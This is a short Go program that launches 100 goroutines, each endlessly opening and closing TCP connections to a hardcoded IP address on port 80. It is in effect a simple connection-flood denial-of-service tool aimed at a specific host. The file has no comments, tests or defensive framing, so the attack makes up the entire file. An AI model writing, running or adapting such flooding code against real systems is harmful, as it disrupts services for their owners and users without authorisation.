package main

import (
	"net"
	"sync"
)

func main() {
	var wg sync.WaitGroup

	for i := 0; i < 100; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				conn, _ := net.Dial("tcp", "193.228.196.49:80")
				if conn != nil {
					conn.Close()
				}
			}
		}()
	}

	wg.Wait()
}
